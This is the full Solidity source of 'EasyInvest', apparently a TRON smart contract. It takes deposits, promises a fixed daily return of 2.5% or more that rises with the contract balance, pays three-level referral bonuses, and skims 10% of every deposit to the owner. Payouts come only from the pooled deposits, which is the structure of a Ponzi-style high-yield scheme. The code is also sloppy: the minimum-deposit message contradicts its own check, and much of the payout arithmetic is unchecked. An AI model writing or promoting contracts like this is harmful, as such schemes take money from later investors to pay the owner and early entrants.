//SourceUnit: easyinvest.sol

pragma solidity 0.4.25;

contract EasyInvest {
    using SafeMath for uint256;

    struct Deposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        Deposit[] deposits;
        mapping(uint8 => uint256) ref_bonus;
        mapping(uint8 => uint256) ref_count;
    }

    address public owner;

    uint256 public invested;
    uint256 public investors;
    uint256 public withdrawn;

    uint256 public direct_bonus;
    uint256 public match_bonus;

    uint8[] public ref_bonuses;

    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;

        ref_bonuses.push(50);
        ref_bonuses.push(30);
        ref_bonuses.push(20);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            _updateTotalPayout(_addr);
            players[_addr].last_payout = uint256(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _updateTotalPayout(address _addr) private{
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];

            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = uint256(block.timestamp);

            if(from < to) {
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * currentROI() / 100 / 8640000;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;

            uint256 bonus = _amount * ref_bonuses[i] / 1000;

            players[up].match_bonus += bonus;
            players[up].ref_bonus[i] += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0)) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus += _amount / 200;
                direct_bonus += _amount / 200;
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount / 200);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].ref_count[i]++;
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
    }

    function deposit(address _upline) external payable {
        require(msg.value >= 1e7, "Zero amount");
        require(msg.value >= 50000000, "Minimal deposit is 25 TRX");
        Player storage player = players[msg.sender];

        require(player.deposits.length < 150, "Max 150 deposits per address");
        if(player.deposits.length == 0){
            investors += 1;
        }

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);

        owner.transfer(msg.value.mul(10).div(100));

        emit NewDeposit(msg.sender, msg.value);
    }

    function withdraw() payable external {
        Player storage player = players[msg.sender];
        _payout(msg.sender);
        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");
        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;
        msg.sender.transfer(amount);
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];

            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = uint256(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * currentROI() / 100 / 8640000;
            }
        }

        return value;
    }

    function currentROI() view private returns(uint256) {
        return uint256(250 + (address(this).balance.div(500000 trx) * 10));
    }


    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(uint256 _available, uint256 _invested, uint256 _withdrawn, uint256[3] memory _ref_bonus, uint256[3] memory _ref_count) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            _ref_bonus[i] = player.ref_bonus[i];
            _ref_count[i] = player.ref_count[i];
        }

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            _ref_bonus,
            _ref_count
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _investors, uint256 _withdrawn, uint256 _current_roi, uint256 _contract_balance) {
        return (invested, investors, withdrawn, currentROI(), address(this).balance);
    }

    function investmentsInfo(address _addr) view external returns(uint256[] memory _invested, uint256[] memory _withdrawn, uint256[] memory _date) {
        Player storage player = players[_addr];

        uint256[] memory __invested = new uint256[](player.deposits.length);
        uint256[] memory __withdrawn = new uint256[](player.deposits.length);
        uint256[] memory __date = new uint256[](player.deposits.length);

        for(uint256 i = 0; i < player.deposits.length; i++) {
          Deposit storage dep = player.deposits[i];
          __invested[i] = dep.amount;
          __withdrawn[i] = dep.totalWithdraw;
          __date[i] = dep.time;
        }

        return (
          __invested,
          __withdrawn,
          __date
        );
    }

    function seperatePayoutOf(address _addr) view external returns(uint256[] memory withdrawable) {
        Player storage player = players[_addr];
        uint256[] memory values = new uint256[](player.deposits.length);
        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];

            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = uint256(block.timestamp);

            if(from < to) {
                values[i] = dep.amount * (to - from) * currentROI() / 100 / 8640000;
            }
        }

        return values;
    }
}

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}